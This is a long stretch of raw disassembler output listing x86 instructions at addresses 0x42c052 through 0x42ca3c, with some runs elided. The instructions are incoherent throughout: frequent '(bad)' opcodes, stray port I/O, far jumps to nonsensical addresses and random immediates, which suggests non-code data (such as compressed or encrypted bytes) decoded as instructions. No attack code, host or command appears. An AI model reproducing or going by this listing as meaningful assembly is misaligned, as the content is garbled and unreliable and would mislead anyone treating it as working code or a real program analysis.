  42c052:	xchg   ebx,eax
  42c053:	xchg   esi,eax
  42c054:	pop    esp
  42c055:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c056:	xchg   ecx,eax
  42c057:	push   ds
  42c058:	cwde   
  42c059:	fisub  DWORD PTR [ebx]
  42c05b:	lds    edi,FWORD PTR [edi-0x69]
  42c05e:	fidiv  WORD PTR [edx+edx*2-0x7e]
  42c062:	sub    esp,DWORD PTR [eax]
  42c064:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c065:	aad    0x59
  42c067:	stos   BYTE PTR es:[edi],al
  42c068:	aam    0x65
  42c06a:	add    BYTE PTR [edx+0x25],ch
	...
  42c0d5:	add    BYTE PTR [edx],bh
  42c0d7:	xchg   edx,eax
  42c0d8:	ja     0x42c10c
  42c0da:	push   edi
  42c0dc:	jg     0x42c078
  42c0de:	leave  
  42c0df:	or     DWORD PTR [edi-0x57],edi
  42c0e2:	add    eax,0x66052ede
  42c0e7:	xlat   BYTE PTR ds:[ebx]
  42c0e8:	add    DWORD PTR [eax],eax
  42c0ea:	inc    DWORD PTR [eax]
  42c0ec:	add    BYTE PTR [eax],al
  42c0ee:	cld    
  42c0ef:	or     esi,edx
  42c0f1:	push   ss
  42c0f2:	lds    eax,FWORD PTR [eax]
  42c0f4:	in     eax,dx
  42c0f5:	lea    edi,[edx-0x2de5631b]
  42c0fb:	xor    al,0xe
  42c0fd:	aas    
  42c0fe:	and    BYTE PTR [edx-0x2a6181e6],cl
  42c104:	dec    ebp
  42c105:	mov    ah,0x56
  42c107:	je     0x42c17c
  42c109:	test   eax,0xbf3a221e
  42c10e:	test   eax,0xa4a12584
  42c113:	jl     0x42c116
  42c115:	dec    edi
  42c116:	cmp    BYTE PTR [ecx+0x2d],dl
  42c119:	push   edi
  42c11a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c11b:	aad    0xaf
  42c11d:	imul   edx,DWORD PTR [edi],0x28
  42c120:	ret    
  42c121:	inc    edi
  42c122:	aad    0x9a
  42c124:	fld    TBYTE PTR [edx]
  42c126:	cwde   
  42c127:	sti    
  42c128:	into   
  42c129:	gs push ebp
  42c12b:	xchg   ecx,eax
  42c12c:	cs push 0x73e70918
  42c132:	jg     0x42c132
  42c134:	inc    ebp
  42c135:	inc    esp
  42c136:	jns    0x42c16c
  42c138:	dec    ebp
  42c139:	mov    eax,0x37c461a6
  42c13e:	stos   BYTE PTR es:[edi],al
  42c13f:	pop    edi
  42c140:	ins    DWORD PTR es:[edi],dx
  42c141:	push   cs
  42c142:	stos   DWORD PTR es:[edi],eax
  42c143:	xchg   DWORD PTR [edx+eiz*2+0x57],edi
  42c147:	ja     0x42c0e4
  42c149:	sbb    BYTE PTR [ecx+ebx*2-0x2f28290d],dh
  42c150:	pop    ebx
  42c151:	and    ebx,DWORD PTR [esi-0x1e]
  42c154:	sub    al,0xe
  42c156:	cmp    ch,BYTE PTR [ebx]
  42c158:	mov    ebx,0x6353f1d5
  42c15d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c15e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c15f:	shr    DWORD PTR [ebx],1
  42c161:	xchg   ebx,eax
  42c162:	add    edi,DWORD PTR [edx-0x2b]
  42c165:	jl     0x42c10b
  42c167:	cmp    al,0xed
  42c169:	pop    ebp
  42c16a:	xor    al,0x5c
  42c16c:	dec    edi
  42c16d:	adc    BYTE PTR [ebx-0x3c],ch
  42c170:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c171:	(bad)  
  42c173:	xchg   ecx,eax
  42c174:	sbb    ecx,DWORD PTR [edi+0x4fde354a]
  42c17a:	or     eax,0xe9408cd5
  42c17f:	sub    edi,edi
  42c181:	sar    BYTE PTR [ecx+0x74],cl
  42c184:	bound  ecx,QWORD PTR [ecx-0x63]
  42c187:	out    0x64,al
  42c189:	pop    ebx
  42c18a:	jg     0x42c1b7
  42c18c:	hlt    
  42c18d:	xchg   edx,eax
  42c18e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c18f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c190:	sahf   
  42c191:	fwait
  42c192:	shl    bh,1
  42c194:	dec    ebp
  42c195:	dec    ebp
  42c196:	aas    
  42c197:	adc    BYTE PTR [ebp-0x6e],cl
  42c19a:	ror    BYTE PTR [ebp-0x6a957c2d],cl
  42c1a0:	ds stos DWORD PTR es:[edi],eax
  42c1a2:	add    al,0xa8
  42c1a4:	out    0x86,eax
  42c1a6:	aaa    
  42c1a7:	xchg   edx,eax
  42c1a8:	in     al,dx
  42c1a9:	adc    al,0xb5
  42c1ab:	push   ds
  42c1ac:	icebp  
  42c1ad:	(bad)  
  42c1ae:	sbb    DWORD PTR [ecx],esp
  42c1b0:	les    esi,FWORD PTR [edx]
  42c1b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c1b3:	xchg   esp,eax
  42c1b4:	sahf   
  42c1b5:	inc    ebp
  42c1b6:	mov    eax,ds:0x4fc6d86
  42c1bb:	sub    ecx,edi
  42c1bd:	sbb    DWORD PTR [edx-0x15],edx
  42c1c0:	push   es
  42c1c1:	jmp    0xa119f206
  42c1c6:	div    BYTE PTR [eax-0x3d]
  42c1c9:	xchg   BYTE PTR [ebp-0x3d],dl
  42c1cc:	fst    QWORD PTR [ebp-0x4d88a9b3]
  42c1d2:	(bad)  
  42c1d3:	xchg   esi,eax
  42c1d4:	jno    0x42c23c
  42c1d6:	adc    al,BYTE PTR [edx-0x20e9fcd1]
  42c1dc:	sti    
  42c1dd:	jb     0x42c248
  42c1df:	mov    al,gs:0xbb2656e
  42c1e5:	push   ecx
  42c1e6:	mov    al,0xaf
  42c1e8:	push   eax
  42c1e9:	xchg   edx,eax
  42c1ea:	cli    
  42c1eb:	or     edi,DWORD PTR [ecx+0x0]
	...
  42c256:	imul   eax,DWORD PTR [edx-0x10105133],0x90f2c76b
  42c260:	xchg   esp,eax
  42c261:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c262:	test   DWORD PTR [ebx],0xd8652321
  42c268:	add    DWORD PTR [eax],eax
  42c26a:	inc    DWORD PTR [eax]
  42c26c:	add    BYTE PTR [eax],al
  42c26e:	sbb    ebx,DWORD PTR [eax]
  42c270:	push   edx
  42c271:	xor    ebx,0xca4f4a8f
  42c277:	loopne 0x42c28a
  42c279:	and    BYTE PTR [eax],bh
  42c27b:	or     BYTE PTR [edx],bl
  42c27d:	sbb    ah,ch
  42c27f:	vandnps ymm0,ymm5,YMMWORD PTR [ecx+ebp*2-0x1f]
  42c285:	sub    edi,esp
  42c287:	dec    ecx
  42c288:	test   DWORD PTR [ebp+0x59],edx
  42c28b:	or     bl,cl
  42c28d:	imul   ecx,DWORD PTR [ecx+ebx*1+0x2],0x3e2d63d1
  42c295:	stos   BYTE PTR es:[edi],al
  42c296:	(bad)  
  42c297:	cld    
  42c298:	sti    
  42c299:	iret   
  42c29a:	daa    
  42c29b:	outs   dx,BYTE PTR ds:[esi]
  42c29c:	mov    ds:0x204d2c06,al
  42c2a1:	pop    eax
  42c2a2:	(bad)  
  42c2a3:	fadd   DWORD PTR [ebx]
  42c2a5:	loopne 0x42c31b
  42c2a7:	mov    dl,0x6
  42c2a9:	jno    0x42c2a3
  42c2ab:	sub    BYTE PTR [ebx*1-0x3e3099ac],al
  42c2b2:	ins    DWORD PTR es:[edi],dx
  42c2b3:	out    0xb7,eax
  42c2b5:	fild   QWORD PTR [esi]
  42c2b7:	lods   eax,DWORD PTR ds:[esi]
  42c2b8:	dec    edx
  42c2b9:	push   edx
  42c2ba:	xchg   edi,eax
  42c2bb:	adc    al,0x91
  42c2bd:	lods   eax,DWORD PTR ds:[esi]
  42c2be:	cmp    esi,edx
  42c2c0:	mov    WORD PTR [ebp+0x71],gs
  42c2c3:	ins    BYTE PTR es:[edi],dx
  42c2c4:	jo     0x42c2ab
  42c2c6:	fwait
  42c2c7:	inc    ebp
  42c2c8:	pop    ss
  42c2c9:	xchg   esi,eax
  42c2ca:	lock push ecx
  42c2cc:	stos   BYTE PTR es:[edi],al
  42c2cd:	and    BYTE PTR [esi+ecx*8-0x32ec91bc],dh
  42c2d4:	dec    ecx
  42c2d5:	outs   dx,BYTE PTR ds:[esi]
  42c2d6:	retf   
  42c2d7:	add    BYTE PTR [ecx],bh
  42c2d9:	cmc    
  42c2da:	and    ah,dh
  42c2dc:	sbb    BYTE PTR ds:[eax],ch
  42c2df:	inc    ebp
  42c2e0:	fs popf 
  42c2e2:	cmc    
  42c2e3:	neg    BYTE PTR [ecx-0x31]
  42c2e6:	(bad)  
  42c2e7:	mov    ds:0x3b95a6f3,eax
  42c2ec:	fisubr WORD PTR [eax+edx*8-0x44]
  42c2f0:	cmp    DWORD PTR [eax-0x7e1a8a92],edx
  42c2f6:	add    eax,0x6697d16
  42c2fb:	pop    ebp
  42c2fc:	fidiv  DWORD PTR [edi]
  42c2fe:	inc    eax
  42c2ff:	cs pop ss
  42c301:	arpl   WORD PTR [ebp+eiz*8-0x12e22d74],bp
  42c308:	push   ebp
  42c309:	aaa    
  42c30a:	stc    
  42c30b:	mov    ch,0x2f
  42c30d:	sar    DWORD PTR [edi],0x37
  42c310:	push   ebp
  42c311:	icebp  
  42c312:	setl   BYTE PTR [ebp-0xe490c95]
  42c319:	rol    edi,cl
  42c31b:	ror    BYTE PTR [ebx],1
  42c31d:	xchg   edx,eax
  42c31e:	int    0xd9
  42c320:	or     ecx,DWORD PTR [ebx-0x16]
  42c323:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c324:	scas   eax,DWORD PTR es:[edi]
  42c325:	sbb    ecx,DWORD PTR [esi]
  42c327:	mov    ebp,0xcff3e13a
  42c32c:	fucomi st,st(7)
  42c32e:	neg    BYTE PTR [edi+0xcd38697]
  42c334:	mov    bl,BYTE PTR [ebx+0x77]
  42c337:	mov    eax,ds:0x32b96e7
  42c33c:	stos   BYTE PTR es:[edi],al
  42c33d:	sub    ebx,DWORD PTR [esi+0x7663f802]
  42c343:	cmp    al,0x79
  42c345:	pushf  
  42c346:	fsubr  QWORD PTR ds:0xbbeea9f0
  42c34c:	or     al,0x67
  42c34e:	sbb    al,0xe0
  42c350:	(bad)  
  42c351:	adc    DWORD PTR [edi-0x7da1fe2b],ebx
  42c357:	sub    eax,0xfcd577f5
  42c35c:	mov    DWORD PTR [ecx-0x3c3b13ab],edi
  42c362:	push   esi
  42c363:	mov    ebp,0xefcd0ab6
  42c368:	push   ecx
  42c369:	sbb    ch,BYTE PTR [ebx+0xdb86]
	...
  42c3d3:	add    BYTE PTR [eax],al
  42c3d5:	add    dh,ah
  42c3d7:	psubusw mm5,QWORD PTR [ebp-0x7]
  42c3db:	push   esi
  42c3dd:	(bad)  
  42c3de:	in     eax,dx
  42c3df:	(bad)  
  42c3e0:	sub    eax,0x700987f6
  42c3e5:	je     0x42c44b
  42c3e7:	fld    DWORD PTR [ecx]
  42c3e9:	add    bh,bh
  42c3eb:	add    BYTE PTR [eax],al
  42c3ed:	add    BYTE PTR [edx-0x58],dl
  42c3f0:	cld    
  42c3f1:	pushf  
  42c3f2:	loope  0x42c3bc
  42c3f4:	xchg   ebx,eax
  42c3f5:	neg    DWORD PTR [esi-0x347fac50]
  42c3fb:	sub    BYTE PTR [edi+esi*8+0x6f254004],ch
  42c402:	inc    edi
  42c403:	inc    ebp
  42c404:	loope  0x42c469
  42c406:	or     BYTE PTR [edi],dh
  42c408:	and    eax,ebx
  42c40a:	cs aam 0xaa
  42c40d:	inc    esp
  42c40e:	push   eax
  42c40f:	inc    edi
  42c410:	retf   0x6e02
  42c413:	dec    ebx
  42c414:	inc    esi
  42c415:	add    al,0x7f
  42c417:	ret    0x6e4a
  42c41a:	out    0xe9,eax
  42c41c:	mov    edx,0xe374fe09
  42c421:	or     al,0xb8
  42c423:	lea    edx,[ecx+0x53]
  42c426:	xchg   edi,eax
  42c427:	int3   
  42c428:	(bad)  
  42c429:	push   edx
  42c42a:	out    0x6b,eax
  42c42c:	cli    
  42c42d:	or     eax,0xd2f48d07
  42c432:	mov    bh,0x5c
  42c434:	adc    eax,edi
  42c436:	mov    esi,0x7440b4e
  42c43b:	fxtract 
  42c43d:	ficomp WORD PTR [ebp-0x6c]
  42c440:	or     bh,BYTE PTR [ebx+eax*8-0x73b6ca77]
  42c447:	or     al,0xf7
  42c44a:	mov    dl,0xfb
  42c44c:	fdivr  QWORD PTR [eax]
  42c44e:	mov    edx,0x6a4f4568
  42c453:	jle    0x42c433
  42c455:	sub    al,0x13
  42c457:	cld    
  42c458:	sub    DWORD PTR [ebp-0x6b4119c4],ecx
  42c45e:	jne    0x42c3f7
  42c460:	add    eax,0x4572014c
  42c465:	icebp  
  42c466:	jecxz  0x42c49f
  42c468:	and    bh,ah
  42c46a:	mov    ch,0xfd
  42c46c:	ds int 0x33
  42c46f:	mov    ds:0x1ec3e9c6,eax
  42c474:	fs shl ecx,cl
  42c477:	ins    BYTE PTR es:[edi],dx
  42c478:	into   
  42c479:	or     eax,0xd89bffd8
  42c47e:	lea    edx,[ebp-0x1115e3d8]
  42c484:	jne    0x42c45b
  42c486:	adc    ebx,DWORD PTR [eax-0x16]
  42c489:	aam    0x1b
  42c48b:	jns    0x42c4a4
  42c48d:	cmp    ebx,ebx
  42c48f:	jne    0x42c501
  42c491:	sbb    DWORD PTR [ecx+ecx*2-0xb],edx
  42c495:	fld    DWORD PTR [ecx]
  42c497:	sbb    eax,0x596cc80c
  42c49c:	xor    DWORD PTR [esi-0x5],esp
  42c49f:	push   ecx
  42c4a0:	pop    edx
  42c4a1:	mov    ch,0x92
  42c4a3:	xlat   BYTE PTR ds:[ebx]
  42c4a4:	xor    eax,0x2037ced0
  42c4a9:	pop    esp
  42c4aa:	data16 stos BYTE PTR es:[edi],al
  42c4ac:	mov    BYTE PTR [edi],0x7d
  42c4af:	sub    eax,DWORD PTR [eax+0x56495db9]
  42c4b5:	mov    ds:0x3c1d7a1,al
  42c4ba:	sub    al,0x85
  42c4bc:	shl    ecx,0xca
  42c4bf:	retf   
  42c4c0:	pusha  
  42c4c1:	ins    DWORD PTR es:[edi],dx
  42c4c2:	dec    ebx
  42c4c3:	cmp    al,0xb7
  42c4c5:	sbb    cl,BYTE PTR [ecx]
  42c4c7:	xor    cl,BYTE PTR [ecx]
  42c4c9:	lock jae 0x42c4a4
  42c4cc:	mov    ds:0xb2cf0ba,al
  42c4d1:	cmp    BYTE PTR [eax-0x2b96112c],bl
  42c4d7:	dec    ebx
  42c4d8:	ins    DWORD PTR es:[edi],dx
  42c4d9:	sbb    BYTE PTR [esi+eiz*2],ch
  42c4dc:	neg    edi
  42c4de:	xchg   esi,eax
  42c4df:	adc    eax,0xcea0c77d
  42c4e4:	retf   0xb146
  42c4e7:	mov    WORD PTR [edx+eax*2+0x52689c],gs
	...
  42c556:	in     al,dx
  42c557:	sbb    ebp,edx
  42c559:	sahf   
  42c55a:	cmc    
  42c55b:	fsubp  st(7),st
  42c55d:	jnp    0x42c511
  42c55f:	sti    
  42c560:	enter  0x6a34,0x68
  42c564:	and    al,0x9d
  42c566:	arpl   dx,bx
  42c568:	add    DWORD PTR [eax],eax
  42c56a:	inc    DWORD PTR [eax]
  42c56c:	add    BYTE PTR [eax],al
  42c56e:	dec    ebx
  42c56f:	pop    ecx
  42c570:	add    edx,esp
  42c572:	aas    
  42c573:	out    0x16,eax
  42c575:	rcr    DWORD PTR fs:[edi+0x69],1
  42c579:	inc    edx
  42c57a:	mov    edi,0x14d6c972
  42c57f:	or     eax,0xb48d670
  42c584:	push   es
  42c585:	cmp    ecx,DWORD PTR [edx]
  42c587:	dec    ebx
  42c588:	push   ds
  42c589:	je     0x42c50d
  42c58b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c58c:	mov    BYTE PTR [eax+0x6cfb2b7a],ch
  42c592:	fistp  WORD PTR [edi-0xcfa02c7]
  42c598:	and    al,0xc5
  42c59a:	pop    es
  42c59b:	inc    esi
  42c59c:	xlat   BYTE PTR ds:[ebx]
  42c59d:	jbe    0x42c569
  42c59f:	loop   0x42c5db
  42c5a1:	mov    esp,0x16ee2092
  42c5a6:	fnsave [edx]
  42c5a8:	loope  0x42c597
  42c5aa:	sbb    al,0x40
  42c5ac:	gs leave 
  42c5ae:	(bad)
  42c5b1:	mov    ds:0x730ad3d6,eax
  42c5b6:	sahf   
  42c5b7:	(bad)  
  42c5b8:	fdiv   DWORD PTR [edi+0x15c50f62]
  42c5be:	(bad)  
  42c5bf:	js     0x42c5a2
  42c5c1:	mov    bh,0x49
  42c5c3:	xlat   BYTE PTR ds:[ebx]
  42c5c4:	push   esp
  42c5c5:	sar    BYTE PTR [ebx],cl
  42c5c7:	pop    esi
  42c5c8:	mov    WORD PTR [edi-0x61],es
  42c5cb:	push   ds
  42c5cc:	call   0x95dbf977
  42c5d1:	mov    bl,0xf4
  42c5d3:	and    ah,BYTE PTR [edi]
  42c5d5:	data16 mov bl,0xf2
  42c5d8:	sbb    DWORD PTR [ecx+0x11],ebp
  42c5db:	push   eax
  42c5dc:	mov    WORD PTR [ecx+eiz*1-0x118495c9],gs
  42c5e3:	out    0x93,eax
  42c5e5:	dec    esi
  42c5e6:	fiadd  DWORD PTR [ecx]
  42c5e8:	pop    eax
  42c5e9:	xor    al,0x89
  42c5eb:	push   eax
  42c5ec:	neg    ch
  42c5ee:	pop    ebp
  42c5ef:	lock jo 0x42c667
  42c5f2:	and    bl,BYTE PTR [esi+0x7]
  42c5f5:	pop    ss
  42c5f6:	dec    eax
  42c5f7:	mov    ds:0xe13388ec,eax
  42c5fc:	pop    edi
  42c5fd:	pop    ecx
  42c5fe:	push   esp
  42c5ff:	imul   ecx,DWORD PTR [esi+esi*2],0xbe24fc74
  42c606:	jle    0x42c5df
  42c608:	stc    
  42c609:	popf   
  42c60a:	mov    cs:0xe091c395,eax
  42c610:	in     eax,0xad
  42c612:	mov    edi,0x304a017e
  42c617:	xlat   BYTE PTR ds:[ebx]
  42c618:	mov    bh,BYTE PTR [eax+0x18c24f3d]
  42c61e:	sbb    BYTE PTR [ecx+ecx*8+0x616ffc99],cl
  42c625:	je     0x42c5ee
  42c627:	xchg   BYTE PTR [ecx],al
  42c629:	push   ecx
  42c62a:	fld    TBYTE PTR [ecx+ebp*2]
  42c62d:	call   DWORD PTR [esp+eiz*2-0x663cdb16]
  42c634:	mov    DWORD PTR [ebp+0x163f9399],edi
  42c63a:	add    al,0xd9
  42c63c:	xchg   BYTE PTR [edx+0x36],dl
  42c63f:	mov    al,0xd
  42c641:	push   edi
  42c642:	gs retf 0x5672
  42c646:	cdq    
  42c647:	pop    es
  42c648:	sub    al,0x6d
  42c64a:	or     al,0xd2
  42c64c:	jns    0x42c647
  42c64e:	xor    esp,DWORD PTR [eax]
  42c650:	cmp    al,0xce
  42c652:	mov    ds:0x18f5273c,al
  42c657:	mov    edx,0xde730f2a
  42c65c:	jl     0x42c60a
  42c65e:	pushf  
  42c65f:	jmp    FWORD PTR [edx+0x79]
  42c662:	neg    DWORD PTR [esi+0x1a26b725]
  42c668:	jg     0x42c622
  42c66a:	ret    
  42c66b:	add    BYTE PTR [eax+0x0],ah
	...
  42c6d5:	add    BYTE PTR [ebp+0x48],bl
  42c6d8:	jle    0x42c668
  42c6da:	jg     0x42c69a
  42c6dc:	std    
  42c6dd:	fstp   TBYTE PTR [ebx+0x416dfc6b]
  42c6e3:	out    dx,eax
  42c6e4:	xlat   BYTE PTR ds:[ebx]
  42c6e5:	bound  esp,QWORD PTR [edx-0x25]
  42c6e8:	add    DWORD PTR [eax],eax
  42c6ea:	inc    DWORD PTR [eax]
  42c6ec:	add    BYTE PTR [eax],al
  42c6ee:	fidivr WORD PTR [edx]
  42c6f0:	xlat   BYTE PTR ds:[ebx]
  42c6f1:	jecxz  0x42c745
  42c6f3:	scas   eax,DWORD PTR es:[edi]
  42c6f4:	push   ebx
  42c6f5:	out    dx,eax
  42c6f6:	std    
  42c6f7:	out    0xbe,al
  42c6f9:	loope  0x42c6c4
  42c6fb:	push   ss
  42c6fc:	adc    al,ch
  42c6fe:	sti    
  42c6ff:	cmp    DWORD PTR [esi],ebp
  42c701:	jno    0x42c684
  42c703:	adc    dh,ch
  42c705:	adc    bh,cl
  42c707:	sahf   
  42c708:	push   0x7b
  42c70a:	in     al,dx
  42c70b:	ins    DWORD PTR es:[edi],dx
  42c70c:	xchg   ebp,esp
  42c70e:	xlat   BYTE PTR ds:[ebx]
  42c70f:	push   0xffffffbb
  42c711:	sub    al,0x91
  42c713:	and    DWORD PTR [ebx+0x65dc4af1],ebx
  42c719:	sub    eax,0xf58d2c94
  42c71e:	ds sub esp,ecx
  42c721:	inc    ebx
  42c722:	pop    ss
  42c723:	inc    BYTE PTR [ebp+ebx*4+0x18f09fe1]
  42c72a:	or     eax,0xfc06d2c5
  42c72f:	push   ss
  42c730:	lea    eax,[eax+0x26f1e9a]
  42c736:	je     0x42c77a
  42c738:	mov    edx,0xb792dc49
  42c73d:	lahf   
  42c73e:	push   ebp
  42c73f:	jno    0x42c713
  42c741:	and    ecx,DWORD PTR [edi-0x2d]
  42c744:	test   eax,0x943b0b1f
  42c749:	ins    DWORD PTR es:[edi],dx
  42c74a:	mov    ds:0x72d01a54,eax
  42c74f:	cld    
  42c750:	int3   
  42c751:	mov    bh,0x40
  42c753:	or     DWORD PTR [edi+edx*4],edi
  42c756:	jnp    0x42c6f0
  42c758:	or     eax,DWORD PTR [edx+0x30]
  42c75b:	stos   BYTE PTR es:[edi],al
  42c75c:	(bad)  [edx]
  42c75e:	sub    bl,cl
  42c760:	fistp  DWORD PTR cs:[ebp-0x22]
  42c764:	and    BYTE PTR [edx+0x326cb999],0xa6
  42c76b:	js     0x42c7c0
  42c76d:	std    
  42c76e:	jns    0x42c6fe
  42c770:	shr    BYTE PTR [ecx+0x3be6ce1c],cl
  42c776:	cmp    al,0x87
  42c778:	jp     0x42c713
  42c77a:	repnz and al,0xf2
  42c77d:	pop    es
  42c77e:	sub    al,cl
  42c780:	dec    edx
  42c781:	(bad)  
  42c782:	ja     0x42c757
  42c784:	fimul  DWORD PTR [edx+eiz*2+0x4da4fd5e]
  42c78b:	dec    edi
  42c78c:	or     al,0xd6
  42c78e:	popf   
  42c78f:	xchg   esi,eax
  42c790:	out    0x9c,al
  42c792:	popf   
  42c793:	leave  
  42c794:	xlat   BYTE PTR ds:[ebx]
  42c795:	aas    
  42c796:	mov    ecx,0x50421b75
  42c79b:	in     al,dx
  42c79c:	cwde   
  42c79d:	loope  0x42c7d2
  42c79f:	push   ebx
  42c7a0:	adc    BYTE PTR [eax+edx*1+0x1cb1bd2e],dh
  42c7a7:	in     al,0x7d
  42c7a9:	enter  0x921f,0x40
  42c7ad:	outs   dx,BYTE PTR ds:[esi]
  42c7ae:	aad    0xcc
  42c7b0:	hlt    
  42c7b1:	lahf   
  42c7b2:	test   DWORD PTR [edi-0x6aa2328e],edi
  42c7b8:	xchg   ecx,eax
  42c7b9:	cld    
  42c7ba:	pop    eax
  42c7bb:	popf   
  42c7bc:	fwait
  42c7bd:	dec    ecx
  42c7be:	loop   0x42c7e2
  42c7c0:	mov    al,ds:0x7437d893
  42c7c5:	xor    BYTE PTR [ebp+0x7b],ah
  42c7c8:	aad    0x9d
  42c7ca:	ins    BYTE PTR es:[edi],dx
  42c7cb:	mov    al,ds:0x38b232b3
  42c7d0:	fsubrp st(1),st
  42c7d2:	push   ebp
  42c7d3:	add    dh,BYTE PTR [eax+0x379728ce]
  42c7d9:	das    
  42c7da:	call   0xbee5:0x127cde7c
  42c7e1:	into   
  42c7e2:	add    al,0x66
  42c7e4:	jmp    0x7f0c922f
  42c7e9:	mov    ebx,DWORD PTR [edi+0x5]
  42c7ec:	fild   DWORD PTR [eax]
	...
  42c856:	cmp    BYTE PTR [ecx-0x8046a96],cl
  42c85c:	jmp    FWORD PTR [ebp-0x5bf1e2a3]
  42c862:	jmp    0x61d81603
  42c867:	fadd   QWORD PTR [ecx]
  42c869:	add    bh,bh
  42c86b:	add    BYTE PTR [eax],al
  42c86d:	add    BYTE PTR [esi-0x2ba9ba13],bh
  42c873:	mov    DWORD PTR [esi+ebp*8+0x4bde016e],edx
  42c87a:	ret    0x10a7
  42c87d:	jbe    0x42c85c
  42c87f:	punpckhbw mm0,QWORD PTR [eax]
  42c882:	sub    DWORD PTR [ebp-0x3a62c97],esi
  42c888:	pop    edx
  42c889:	mov    dl,0xdd
  42c88b:	ret    0xb835
  42c88e:	pop    es
  42c88f:	shrd   DWORD PTR [edi-0x6a],eax,cl
  42c893:	test   DWORD PTR [ecx],ebp
  42c895:	test   DWORD PTR [edi-0xed7ea29],ebp
  42c89b:	lods   al,BYTE PTR ds:[esi]
  42c89c:	mov    ebx,0xff2dc510
  42c8a1:	pop    esp
  42c8a2:	iret   
  42c8a3:	daa    
  42c8a4:	xchg   edi,eax
  42c8a5:	inc    edi
  42c8a6:	cmp    ebx,DWORD PTR [edi]
  42c8a8:	jb     0x42c871
  42c8aa:	ret    0xa7f1
  42c8ad:	(bad)  
  42c8ae:	cli    
  42c8af:	fild   DWORD PTR [edx]
  42c8b1:	(bad)  
  42c8b2:	mov    esp,0x91c8cb0
  42c8b7:	cld    
  42c8b8:	sub    bl,BYTE PTR [ecx]
  42c8ba:	lods   al,BYTE PTR ds:[esi]
  42c8bb:	pop    es
  42c8bc:	imul   esp,DWORD PTR [edx+esi*8-0x39],0x27
  42c8c1:	fbld   TBYTE PTR [edx+0x716cd555]
  42c8c7:	dec    esp
  42c8c8:	out    dx,eax
  42c8c9:	ins    BYTE PTR es:[edi],dx
  42c8ca:	push   esi
  42c8cb:	or     BYTE PTR [esi+0x69a391be],bl
  42c8d1:	cs (bad) 
  42c8d3:	mov    edi,0xa3533c97
  42c8d8:	sub    esi,DWORD PTR [eax]
  42c8da:	mov    eax,ebx
  42c8dc:	lds    esp,FWORD PTR [edx-0x70b5fe40]
  42c8e2:	sub    edx,DWORD PTR [edi+0x25]
  42c8e5:	rcr    BYTE PTR [edx+0xdf102e4],0xf
  42c8ec:	adc    ecx,DWORD PTR [ecx+0x2a]
  42c8ef:	push   es
  42c8f0:	adc    esi,edx
  42c8f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c8f3:	clc    
  42c8f4:	and    ebp,DWORD PTR ds:0x6edfe6fc
  42c8fa:	ret    
  42c8fb:	jae    0x42c8c5
  42c8fd:	mov    ah,0x1a
  42c8ff:	lahf   
  42c900:	cwde   
  42c901:	mov    al,ds:0xc68f961b
  42c906:	hlt    
  42c907:	(bad)  
  42c908:	sub    eax,0x104f47ff
  42c90d:	out    dx,eax
  42c90e:	sbb    ch,cl
  42c910:	sbb    ch,BYTE PTR [esp+ebp*1+0x3d]
  42c914:	add    BYTE PTR [edx-0x162a7fe0],dh
  42c91a:	xor    DWORD PTR [eax-0x4a967004],ebp
  42c920:	popf   
  42c921:	mov    esi,0x2cd48230
  42c926:	ins    DWORD PTR es:[edi],dx
  42c927:	sub    BYTE PTR [ebx-0x66],al
  42c92a:	add    eax,0x94b4181d
  42c92f:	test   eax,0x36e57abe
  42c934:	push   edi
  42c935:	mov    ecx,0xb336c25c
  42c93a:	push   ebx
  42c93b:	push   edx
  42c93c:	pop    es
  42c93d:	jg     0x42c9b5
  42c93f:	jae    0x42c92b
  42c941:	mov    BYTE PTR [esi+0x517f15f0],ah
  42c947:	jp     0x42c96b
  42c949:	clc    
  42c94a:	push   esi
  42c94b:	jae    0x42c92c
  42c94d:	and    ecx,ebp
  42c94f:	and    eax,0x8ee7ad0
  42c954:	or     DWORD PTR [esi-0x495173d6],0xa008a311
  42c95e:	shl    ah,1
  42c960:	xor    dl,BYTE PTR [esi]
  42c962:	jmp    0x42c8f0
  42c964:	inc    esp
  42c965:	psubd  mm2,QWORD PTR [edi+0x2f]
  42c969:	sub    BYTE PTR [ebp+0x65bb],dh
	...
  42c9d3:	add    BYTE PTR [eax],al
  42c9d5:	add    BYTE PTR [eax],dl
  42c9d7:	sbb    ecx,ecx
  42c9d9:	jmp    0xfb73c5a9
  42c9de:	(bad)  
  42c9df:	scas   eax,DWORD PTR es:[edi]
  42c9e0:	inc    edi
  42c9e1:	call   0x7dde9485
  42c9e6:	pusha  
  42c9e7:	fld    QWORD PTR [ecx]
  42c9e9:	add    bh,bh
  42c9eb:	add    BYTE PTR [eax],al
  42c9ed:	add    BYTE PTR [edi],dl
  42c9ef:	sub    ebp,ecx
  42c9f1:	cwde   
  42c9f2:	add    dh,BYTE PTR [esi-0x41c9ae7c]
  42c9f8:	jnp    0x42ca0f
  42c9fa:	pop    ecx
  42c9fb:	mov    al,ds:0x4128dfc8
  42ca00:	popf   
  42ca01:	jg     0x42ca51
  42ca03:	or     ax,0xa2e7
  42ca07:	in     eax,dx
  42ca08:	mov    BYTE PTR [edx-0x12d1a667],cl
  42ca0e:	jno    0x42c9df
  42ca10:	std    
  42ca11:	repz push eax
  42ca13:	adc    al,BYTE PTR [edi]
  42ca15:	push   esp
  42ca16:	je     0x42ca00
  42ca18:	into   
  42ca19:	adc    BYTE PTR [edx+0x60],cl
  42ca1c:	pushf  
  42ca1d:	fdiv   DWORD PTR ds:0xa3856fae
  42ca23:	(bad)  
  42ca24:	inc    edi
  42ca25:	lock xchg DWORD PTR [ebp+ecx*8+0x2e56b36f],ebp
  42ca2d:	sub    eax,0xd2904f7b
  42ca32:	mov    es:0xf450960c,eax
  42ca38:	int    0xde
  42ca3a:	jno    0x42ca38
  42ca3c:	inc    esi
